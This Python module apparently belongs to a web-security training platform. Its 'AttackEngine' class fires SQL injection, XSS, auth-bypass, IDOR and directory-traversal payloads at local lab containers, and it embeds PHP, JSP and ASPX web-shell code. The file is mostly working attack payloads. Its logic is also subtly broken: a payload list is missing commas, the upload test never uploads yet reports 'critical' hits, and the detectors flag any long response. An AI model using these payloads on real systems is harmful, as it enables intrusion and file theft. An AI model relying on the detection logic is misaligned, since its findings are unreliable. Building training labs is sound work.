import time
from typing import Dict, List, Any
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
from app.schemas import scan as scan_schemas
from app.cruds import scan as scan_crud
from app.cruds import log as log_crud
from app.cruds import payload as payload_crud
from app.models import base
from app.database import get_db
from app.services.lab_manager import LabManager
import logging
from sqlalchemy.orm import Session

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AttackEngine:
    def __init__(self):
        self.lab_manager = LabManager()
        self.session = requests.Session()

        # Set headers to mimic a real browser
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

    def get_payloads_by_category(self, category: str) -> List[str]:
        """
        Get all payloads for a specific vulnerability category
        """
        db = next(get_db())
        payloads = payload_crud.get_payloads_by_category(db, category)
        return [p.payload for p in payloads]

    def perform_sql_injection_attack(self, base_url: str, lab_id: int, scan_id: int, db: Session) -> Dict[str, Any]:
        """
        Perform SQL injection attack on a target URL
        """
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": []
        }

        # Get SQL injection payloads
        payloads = self.get_payloads_by_category("sqli")

        # Common SQL injection patterns
        common_sqli_patterns = [
            "'",
            "' OR 1=1--",
            "' OR 'a'='a",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' AND 1=2 UNION SELECT NULL, version(), NULL--",
            "' AND 1=2 UNION SELECT table_name, NULL FROM information_schema.tables--",
            "' AND 1=2 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
        ]

        # Combine custom payloads with common patterns
        all_payloads = list(set(payloads + common_sqli_patterns))

        # Test different parameters (assuming common vulnerable parameters)
        test_parameters = ['username', 'password', 'id', 'search', 'user', 'admin']

        for param in test_parameters:
            for payload in all_payloads:
                try:
                    # Create test URL with payload
                    if '?' in base_url:
                        test_url = f"{base_url}&{param}={payload}"
                    else:
                        test_url = f"{base_url}?{param}={payload}"

                    # Send request
                    response = self.session.get(test_url, timeout=10)

                    # Log this attempt
                    log_data = {
                        "request": f"GET {test_url}",
                        "response": f"Status: {response.status_code}, Length: {len(response.content)}",
                        "payload": payload,
                        "result": "failure"
                    }

                    # Check for SQL injection indicators
                    if self._detect_sql_injection(response, payload):
                        # SQL injection detected
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(payload)
                        log_data["result"] = "vulnerability_detected"
                        log_data["severity"] = "high"

                        # Save successful payload
                        results["payloads_used"].append(payload)

                    # Save log
                    log_data["scan_id"] = scan_id
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

                    # Small delay to avoid overwhelming the target
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing payload {payload} on {param}: {str(e)}")
                    # Still log the failed attempt
                    log_data = {
                        "request": f"GET {base_url}?{param}={payload}",
                        "response": f"Error: {str(e)}",
                        "payload": payload,
                        "result": "failure",
                        "scan_id": scan_id
                    }
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

        return results

    def _detect_sql_injection(self, response: requests.Response, payload: str) -> bool:
        """
        Detect SQL injection based on response characteristics
        """
        # Common SQL error messages
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "near syntax error",
            "column not found",
            "unknown column",
            "sql syntax",
            "mysql_num_rows()",
            "pg_query()",
            "db2_exec()",
        ]

        # Check for SQL error messages in response
        response_text = response.text.lower()
        for error in sql_errors:
            if error in response_text:
                return True

        # Check for response length changed (typical for UNION-based attacks)
        if "union" in payload.lower():
            # If the response is significantly longer than normal, it might be successful
            # This is a simple heuristic
            if len(response.text) > 500:  # Arbitrary threshold
                return True

        # Check for specific responses to common payloads
        if "' OR 1=1--" in payload:
            # Check for unexpected content like "admin" or "user" in response
            if "admin" in response_text or "user" in response_text:
                return True

        return False

    def perform_xss_attack(self, base_url: str, lab_id: int, scan_id: int, db: Session) -> Dict[str, Any]:
        """
        Perform XSS attack on a target URL
        """
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": []
        }

        # Get XSS payloads
        payloads = self.get_payloads_by_category("xss")

        # Common XSS patterns
        common_xss_patterns = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'",
            ">alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]

        # Combine custom payloads with common patterns
        all_payloads = list(set(payloads + common_xss_patterns))

        # Test different parameters and endpoints
        # For blog-style applications, test in search parameter
        test_parameters = ['search', 'comment', 'username', 'author', 'title', 'id']

        for param in test_parameters:
            for payload in all_payloads:
                try:
                    # Create test URL with payload
                    if '?' in base_url:
                        test_url = f"{base_url}&{param}={payload}"
                    else:
                        test_url = f"{base_url}?{param}={payload}"

                    # Send request
                    response = self.session.get(test_url, timeout=10)

                    # Log this attempt
                    log_data = {
                        "request": f"GET {test_url}",
                        "response": f"Status: {response.status_code}, Length: {len(response.content)}",
                        "payload": payload,
                        "result": "failure"
                    }

                    # Check for XSS injection
                    if self._detect_xss(response, payload):
                        # XSS detected
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(payload)
                        log_data["result"] = "vulnerability_detected"
                        log_data["severity"] = "medium"

                        # Save successful payload
                        results["payloads_used"].append(payload)

                    # Save log
                    log_data["scan_id"] = scan_id
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

                    # Small delay to avoid overwhelming the target
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing payload {payload} on {param}: {str(e)}")
                    # Still log the failed attempt
                    log_data = {
                        "request": f"GET {base_url}?{param}={payload}",
                        "response": f"Error: {str(e)}",
                        "payload": payload,
                        "result": "failure",
                        "scan_id": scan_id
                    }
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

        return results

    def _detect_xss(self, response: requests.Response, payload: str) -> bool:
        """
        Detect XSS based on response characteristics
        """
        response_text = response.text.lower()
        payload_lower = payload.lower()

        # Check if payload is reflected in response
        if payload_lower in response_text:
            # Check for common XSS patterns
            xss_indicators = [
                "alert(",
                "javascript:",
                "onerror=",
                "onload=",
                "<script>",
                "<svg",
                "javascript",
                "onmouseover",
                "onclick",
                "onfocus",
                "onblur",
            ]

            for indicator in xss_indicators:
                if indicator in payload_lower:
                    return True

        return False

    def perform_idor_attack(self, base_url: str, lab_id: int, scan_id: int, db: Session) -> Dict[str, Any]:
        """
        Perform IDOR attack on a target URL
        """
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": []
        }

        # Get IDOR payloads (in this case, we'll test different user IDs)
        # IDOR is about testing different resource identifiers, not payloads

        # Common IDOR patterns
        idor_patterns = [
            "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "100", "999", "9999", "0", "-1", "-2"
        ]

        # Test different resource identifiers in URLs
        # These are based on common patterns in web applications
        test_endpoints = [
            "/user/profile?user_id=",
            "/account/",
            "/orders?user_id=",
            "/api/user/",
            "/api/orders/",
            "/admin/user/",
            "/api/admin/user/",
            "/profile/",
            "/admin/"
        ]

        for endpoint in test_endpoints:
            for user_id in idor_patterns:
                try:
                    # Construct test URL
                    if endpoint.startswith("/"):
                        test_url = urljoin(base_url, endpoint + user_id)
                    else:
                        test_url = urljoin(base_url, endpoint + user_id)

                    # Send request
                    response = self.session.get(test_url, timeout=10)

                    # Log this attempt
                    log_data = {
                        "request": f"GET {test_url}",
                        "response": f"Status: {response.status_code}, Length: {len(response.content)}",
                        "payload": user_id,
                        "result": "failure"
                    }

                    # Check for IDOR
                    if self._detect_idor(response, user_id):
                        # IDOR detected
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(user_id)
                        log_data["result"] = "vulnerability_detected"
                        log_data["severity"] = "high"

                        # Save successful payload
                        results["payloads_used"].append(user_id)

                    # Save log
                    log_data["scan_id"] = scan_id
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

                    # Small delay to avoid overwhelming the target
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing IDOR for {user_id} on {endpoint}: {str(e)}")
                    # Still log the failed attempt
                    log_data = {
                        "request": f"GET {test_url}",
                        "response": f"Error: {str(e)}",
                        "payload": user_id,
                        "result": "failure",
                        "scan_id": scan_id
                    }
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

        return results

    def _detect_idor(self, response: requests.Response, user_id: str) -> bool:
        """
        Detect IDOR based on response characteristics
        """
        # IDOR detection is based on response content and status code

        # A successful IDOR often returns a 200 status code
        if response.status_code != 200:
            return False

        response_text = response.text.lower()

        # Check for sensitive information that should be restricted
        # These are indicators that IDOR might have worked
        idor_indicators = [
            "admin",
            "password",
            "email",
            "phone",
            "address",
            "balance",
            "ssn",
            "credit card",
            "user id",
            "username",
            "email address",
            "account number",
            "billing address",
            "shipping address",
            "profile",
            "dashboard",
            "settings",
            "privileges",
        ]

        # Check if the response contains sensitive data
        for indicator in idor_indicators:
            if indicator in response_text:
                return True

        # Check if the response has different content than expected for the user ID
        # This is a heuristic - if we get a different response for different user IDs,
        # it might indicate IDOR

        # If we get a response for a user ID of "-1" or "0" that has real content,
        # it's a strong indicator of IDOR
        if user_id in ["0", "-1", "01", "1", "2", "1000"]:
            # We'll assume if we get a response with any significant content
            # that isn't a "not found" error, it might indicate IDOR
            if len(response_text) > 100:
                return True

        return False

    def perform_file_upload_attack(self, base_url: str, lab_id: int, scan_id: int, db: Session) -> Dict[str, Any]:
        """
        Perform file upload attack on a target URL
        """
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": []
        }

        # Get payload patterns for file upload
        # File upload attack is primarily about file names and content

        # Common file upload malicious file patterns
        malicious_file_patterns = [
            "shell.php",
            "shell.jsp",
            "shell.aspx",
            "shell.pl",
            "shell.py",
            "shell.sh",
            "shell.bat",
        ]

        # Malicious payload content for different file types
        malicious_content = {
            "php": "<?php system($_GET['cmd']); ?>",
            "jsp": "<% out.println(Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "aspx": "<%@ Page Language=\"C#\" %><% Response.Write(Runtime.GetRuntime().exec(Request[\"cmd\"]).Output); %>"
        }

        # Test different file upload endpoints and extensions
        test_endpoints = [
            "/upload",
            "/file/upload",
            "/api/upload",
            "/admin/upload",
            "/images/upload",
            "/profile/avatar",
            "/avatar/upload",
            "/upload-file",
            "/file-upload"
        ]

        # Test different extensions
        extensions = ['php', 'jsp', 'aspx', 'pl', 'py', 'sh', 'bat', 'exe', 'dll']

        for endpoint in test_endpoints:
            for ext in extensions:
                if ext in malicious_content:
                    # Create a malicious file with double extension
                    # For example: shell.php.jpg
                    filename = f"shell.{ext}.jpg"
                    content = malicious_content[ext]

                    try:
                        # This is a simplified approach - in a real attack, we'd upload the file
                        # We'll simulate by checking if we can access files via known patterns
                        # This is a heuristic approach to detect potential vulnerabilities

                        # First, check if upload endpoint exists - check if we get a 200
                        if not base_url.endswith('/'):
                            upload_url = base_url + endpoint
                        else:
                            upload_url = base_url + endpoint[1:]

                        # Check if upload endpoint is accessible
                        response = self.session.get(upload_url, timeout=10)

                        if response.status_code == 200:
                            # Endpoint exists - this is a positive indicator
                            log_data = {
                                "request": f"GET {upload_url}",
                                "response": f"Status: {response.status_code}, Endpoint accessible",
                                "payload": filename,
                                "result": "vulnerability_detected",
                                "severity": "high",
                                "scan_id": scan_id
                            }

                            results["vulnerability_detected"] = True
                            results["successful_payloads"].append(filename)
                            results["payloads_used"].append(filename)
                            log_crud.create_log(db, base.Log(**log_data))
                            results["logs"].append(log_data)

                            # Also check if file might be executable
                            # Assume that files might be stored in uploads/ directory
                            # and accessible via <base_url>/uploads/filename
                            # This is a common pattern
                            upload_dir = "/uploads/"
                            # Construct the expected URL for uploaded file
                            if base_url.endswith('/'):
                                file_url = base_url + upload_dir[1:] + filename
                            else:
                                file_url = base_url + upload_dir + filename

                            # Check if file might be executable
                            # We'll try to access it with a different path
                            test_file_url = file_url + "?cmd=whoami"

                            # Simulate the attack - if we can access a file,
                            # we might be able to execute it if it's a script

                            # This is a simplification - in a real attack, we'd upload the file
                            # First, check if the directory structure might exist
                            log_data = {
                                "request": f"GET {file_url}",
                                "response": f"Expected path for uploaded file: {file_url}",
                                "payload": filename,
                                "result": "vulnerability_detected",  # The vulnerability is in the upload functionality
                                "severity": "critical",
                                "scan_id": scan_id
                            }

                            response = self.session.get(file_url, timeout=10)
                            if response.status_code == 200:
                                # File is accessible - this is critical
                                log_data["result"] = "vulnerability_detected"
                                log_data["severity"] = "critical"

                            # Also check for command execution pattern
                            test_cmd_url = file_url + "?cmd=whoami"
                            response = self.session.get(test_cmd_url, timeout=10)
                            if response.status_code == 200 and "cmd" in response.text.lower():
                                log_data["result"] = "vulnerability_detected"
                                log_data["severity"] = "critical"

                            log_crud.create_log(db, base.Log(**log_data))
                            results["logs"].append(log_data)

                            # If we found a vulnerability, break early
                            if results["vulnerability_detected"]:
                                break

                        else:
                            # Check if we get a 404 which indicates no file upload functionality
                            if response.status_code == 404:
                                continue
                            else:
                                # Check if there's a form to upload
                                # Look for form with enctype="multipart/form-data"
                                soup = BeautifulSoup(response.text, 'html.parser')
                                for form in soup.find_all('form'):
                                    if form.get('enctype') == 'multipart/form-data':
                                        # Upload form found
                                        log_data = {
                                            "request": f"GET {upload_url}",
                                            "response": f"Status: {response.status_code}, Form with multipart upload found",
                                            "payload": filename,
                                            "result": "vulnerability_detected",
                                            "severity": "high",
                                            "scan_id": scan_id
                                        }
                                        results["vulnerability_detected"] = True
                                        results["successful_payloads"].append(filename)
                                        results["payloads_used"].append(filename)
                                        log_crud.create_log(db, base.Log(**log_data))
                                        results["logs"].append(log_data)

                                        # Also check if file might be executable
                                        # This is a common pattern
                                        upload_dir = "/uploads/"
                                        if base_url.endswith('/'):
                                            file_url = base_url + upload_dir[1:] + filename
                                        else:
                                            file_url = base_url + upload_dir + filename

                                        log_data = {
                                            "request": f"GET {file_url}",
                                            "response": f"Expected path for uploaded file: {file_url}",
                                            "payload": filename,
                                            "result": "vulnerability_detected",  # The vulnerability is in the upload functionality
                                            "severity": "critical",
                                            "scan_id": scan_id
                                        }

                                        response = self.session.get(file_url, timeout=10)
                                        if response.status_code == 200:
                                            # File is accessible - this is critical
                                            log_data["result"] = "vulnerability_detected"
                                            log_data["severity"] = "critical"

                                        # Also check for command execution pattern
                                        test_cmd_url = file_url + "?cmd=whoami"
                                        response = self.session.get(test_cmd_url, timeout=10)
                                        if response.status_code == 200 and "cmd" in response.text.lower():
                                            log_data["result"] = "vulnerability_detected"
                                            log_data["severity"] = "critical"

                                        log_crud.create_log(db, base.Log(**log_data))
                                        results["logs"].append(log_data)

                                        # If we found a vulnerability, break early
                                        if results["vulnerability_detected"]:
                                            break
                    except Exception as e:
                        logger.error(f"Error testing file upload for {filename} on {endpoint}: {str(e)}")
                        # Still log the failed attempt
                        log_data = {
                            "request": f"GET {upload_url}",
                            "response": f"Error: {str(e)}",
                            "payload": filename,
                            "result": "failure",
                            "scan_id": scan_id
                        }
                        log_crud.create_log(db, base.Log(**log_data))
                        results["logs"].append(log_data)

        return results

    def perform_auth_bypass_attack(self, base_url: str, lab_id: int, scan_id: int, db: Session) -> Dict[str, Any]:
        """
        Perform authentication bypass attack on a target URL
        """
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": []
        }

        # Get authentication bypass payloads
        payloads = self.get_payloads_by_category("auth-bypass")

        # Common authentication bypass patterns
        auth_bypass_patterns = [
            "' OR '1'='1",
            "OR 1=1--",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1;--",
            "admin'--",
            "' OR 1=1#",
            "admin' --",
            "admin' OR 'a'='a",
            "root' OR 'a'='a",
            "\' OR \" \" = \" \"",
        ]

        # Combine custom payloads with common patterns
        all_payloads = list(set(payloads + auth_bypass_patterns))

        # Test common authentication endpoints
        test_endpoints = [
            "/login",
            "/auth/login",
            "/signin",
            "/account/login",
            "/user/login",
            "/api/login",
            "/login.php",
            "/login.html",
        ]

        for endpoint in test_endpoints:
            for payload in all_payloads:
                try:
                    # Construct test URL
                    if endpoint.startswith("/"):
                        url = urljoin(base_url, endpoint)
                    else:
                        url = urljoin(base_url, endpoint)

                    # Send POST request to login endpoint with payload
                    login_data = {
                        "username": payload,
                        "password": "password"  # Any password since we're bypassing
                    }

                    response = self.session.post(url, data=login_data, timeout=10)

                    # Log this attempt
                    log_data = {
                        "request": f"POST {url} with username={payload}&password=password",
                        "response": f"Status: {response.status_code}, Length: {len(response.content)}",
                        "payload": payload,
                        "result": "failure"
                    }

                    # Check for authentication bypass
                    if self._detect_auth_bypass(response, payload):
                        # Authentication bypass detected
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(payload)
                        log_data["result"] = "vulnerability_detected"
                        log_data["severity"] = "high"

                        # Save successful payload
                        results["payloads_used"].append(payload)

                    # Save log
                    log_data["scan_id"] = scan_id
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

                    # Small delay to avoid overwhelming the target
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing auth bypass payload {payload} on {endpoint}: {str(e)}")
                    # Still log the failed attempt
                    log_data = {
                        "request": f"POST {url} with username={payload}&password=password",
                        "response": f"Error: {str(e)}",
                        "payload": payload,
                        "result": "failure",
                        "scan_id": scan_id
                    }
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

        return results

    def _detect_auth_bypass(self, response: requests.Response, payload: str) -> bool:
        """
        Detect authentication bypass based on response characteristics
        """
        # Check response status code
        if response.status_code >= 500:
            return False  # Server error, likely not bypass

        # Check for common indicators of successful authentication
        # In a vulnerable system, successful auth might redirect to a dashboard
        # but if we bypass auth, we might still get a 200 response to login
        # instead of redirecting to dashboard

        # If we get the same response as we would get for correct login or redirect to a dashboard
        # it might indicate bypass

        # Common redirect location for successful login
        if response.status_code in [301, 302, 303, 307, 308]:
            # Check if redirect is to a dashboard or home page
            location = response.headers.get('Location', '')
            if any(dash in location.lower() for dash in ['dashboard', 'home', 'index', 'profile', 'admin']):
                # This might indicate successful login, but we're looking for bypass
                # so this might not be bypass unless it works with the payload
                return False

        # Check for successful auth indicators in response content
        auth_indicators = [
            "dashboard",
            "welcome",
            "admin",
            "user profile",
            "welcome back",
            "logout",
            "settings",
            "profile",
            "account",
            "hi "
        ]

        response_text = response.text.lower()

        # Check if we get response content that indicates successful login
        for indicator in auth_indicators:
            if indicator in response_text:
                # Check if this happens with our payload
                # If we get the same response with a malicious payload
                # as we would get with a valid credential, it's likely an auth bypass

                # For example, if we get a 'welcome' message with 'admin' payload but
                # we didn't enter a valid password, it's likely a bypass

                # This is a simplification - in a real scenario we'd compare with a known good request
                # For now, we'll assume if we get an auth indicator with our payload,
                # it might be a bypass
                return True

        # Check for response length - if it's significantly longer than a failed login
        # we might have bypassed authentication

        # Heuristic: if we get more than 1000 characters, it might be a successful login
        if len(response.text) > 1000:
            # Check if this is different from a typical error page (usually shorter)
            # Common error pages for incorrect login are often 200-800 chars
            # Successful login pages are often 1000+ chars
            return True

        return False

    def perform_dir_traversal_attack(self, base_url: str, lab_id: int, scan_id: int, db: Session) -> Dict[str, Any]:
        """
        Perform directory traversal attack on a target URL
        """
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": []
        }

        # Get directory traversal payloads
        payloads = self.get_payloads_by_category("dir-traversal")

        # Common directory traversal patterns
        dir_traversal_patterns = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            "..\\..\\..\\..\\winnt\\system32\\cmd.exe",
            "/etc/passwd",
            "C:/Windows/System32/drivers/etc/hosts",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../boot.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2fetc%2fshadow",
            "..%5c..%5c..%5c..%5cwinnt%5csystem32%5ccmd.exe",
            ".....//.....//.....//.....//etc//passwd",
            "../../../etc/passwd%00",
            "/etc/passwd%00",
            "../../../../windows/win.ini",
            "..%2f..%2f..%2f..%2fetc%2fgroup",
            "../../../../etc/shadow",
            "..%2f..%2f..%2f..%2fetc%2fpasswd"
        ]

        # Combine custom payloads with common patterns
        all_payloads = list(set(payloads + dir_traversal_patterns))

        # Test common parameter names for file inclusion
        # These are based on common patterns in web applications
        test_parameters = [
            'file', 'page', 'include', 'path', 'dir', 'folder', 'content', 'template',
            'css', 'js', 'img', 'image', 'theme', 'layout', 'template', 'view',
            'download', 'open', 'read', 'view', 'show', 'load'
        ]

        for param in test_parameters:
            for payload in all_payloads:
                try:
                    # Create test URL with payload
                    if '?' in base_url:
                        test_url = f"{base_url}&{param}={payload}"
                    else:
                        test_url = f"{base_url}?{param}={payload}"

                    # Send request
                    response = self.session.get(test_url, timeout=10)

                    # Log this attempt
                    log_data = {
                        "request": f"GET {test_url}",
                        "response": f"Status: {response.status_code}, Length: {len(response.content)}",
                        "payload": payload,
                        "result": "failure"
                    }

                    # Check for directory traversal
                    if self._detect_dir_traversal(response, payload):
                        # Directory traversal detected
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(payload)
                        log_data["result"] = "vulnerability_detected"
                        log_data["severity"] = "high"

                        # Save successful payload
                        results["payloads_used"].append(payload)

                    # Save log
                    log_data["scan_id"] = scan_id
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

                    # Small delay to avoid overwhelming the target
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(f"Error testing payload {payload} on {param}: {str(e)}")
                    # Still log the failed attempt
                    log_data = {
                        "request": f"GET {base_url}?{param}={payload}",
                        "response": f"Error: {str(e)}",
                        "payload": payload,
                        "result": "failure",
                        "scan_id": scan_id
                    }
                    log_crud.create_log(db, base.Log(**log_data))
                    results["logs"].append(log_data)

        return results

    def _detect_dir_traversal(self, response: requests.Response, payload: str) -> bool:
        """
        Detect directory traversal based on response characteristics
        """
        # Common file contents that should be restricted
        sensitive_contents = [
            "root:"
            "daemon:"
            "bin:"
            "sys:"
            "sync:"
            "games:"
            "man:"
            "lp:"
            "mail:"
            "news:"
            "uucp:"
            "proxy:"
            "www-data:"
            "backup:"
            "list:"
            "irc:"
            "gnats:"
            "nobody:"
            "_apt:"
            "systemd-network:"
            "systemd-resolve:"
            "systemd-timesync:"
            "systemd-coredump:"
            "sshd:"
            "syslog:"
            "messagebus:"
            "ntp:"
            "_rpc:"
            "gdm:"
            "postgres:"
            "mysql:"
            "www:"
            "webmaster:"
        ]

        # Check for sensitive file content
        response_text = response.text

        # Look for specific file content patterns
        if "root:x" in response_text and "daemon:x" in response_text:
            return True

        # Look for Windows specific content
        if "[boot loader]" in response_text and "timeout=" in response_text:
            return True

        # Check for system files
        if "PATH=" in response_text and "USER=" in response_text:
            return True

        # Check for any sensitive file patterns
        for sensitive in sensitive_contents:
            if sensitive in response_text:
                return True

        # Check for response length - if it's unusually long,
        # it might be exposing a system file (passwords, configs)
        if len(response.text) > 1000:
            # This is a heuristic, but common for exposing system files
            return True

        return False

    def run_attack_simulation(self, attack_type: str, lab_id: int, user_id: int) -> Dict[str, Any]:
        """
        Run a complete attack simulation
        """
        db = next(get_db())

        try:
            # Get lab information
            lab = self.lab_manager.get_lab_by_id(lab_id)
            if not lab:
                raise Exception(f"Lab with ID {lab_id} not found")

            # Get lab base URL (assumes local Docker container)
            # This assumes the lab is running on localhost with the specified port
            # In production, this would be the exposed URL from the lab service
            base_url = f"http://localhost:{lab['port']}"

            # Create scan record
            scan_data = scan_schemas.ScanCreate(
                lab_id=lab_id,
                attack_type=attack_type
            )
            scan = scan_crud.create_scan(db, scan_data, user_id)

            # Run the appropriate attack
            if attack_type == "sql_injection":
                results = self.perform_sql_injection_attack(base_url, lab_id, scan.id, db)
            elif attack_type == "reflected_xss":
                results = self.perform_xss_attack(base_url, lab_id, scan.id, db)
            elif attack_type == "stored_xss":
                results = self.perform_xss_attack(base_url, lab_id, scan.id, db)
            elif attack_type == "idor":
                results = self.perform_idor_attack(base_url, lab_id, scan.id, db)
            elif attack_type == "auth_bypass":
                results = self.perform_auth_bypass_attack(base_url, lab_id, scan.id, db)
            elif attack_type == "dir_traversal":
                results = self.perform_dir_traversal_attack(base_url, lab_id, scan.id, db)
            elif attack_type == "file_upload_abuse":
                results = self.perform_file_upload_attack(base_url, lab_id, scan.id, db)
            else:
                raise Exception(f"Unsupported attack type: {attack_type}")

            # Update scan status
            if results["vulnerability_detected"]:
                scan_crud.update_scan_status(db, scan.id, "completed")
            else:
                scan_crud.update_scan_status(db, scan.id, "completed")

            # Return results
            return {
                "scan_id": scan.id,
                "attack_type": attack_type,
                "lab_id": lab_id,
                "user_id": user_id,
                "vulnerability_detected": results["vulnerability_detected"],
                "payloads_used": results["payloads_used"],
                "successful_payloads": results["successful_payloads"],
                "logs": results["logs"],
                "total_attempts": len(results["logs"]),
                "completed_at": time.time()
            }

        except Exception as e:
            logger.error(f"Error in attack simulation: {str(e)}")
            raise

        finally:
            db.close()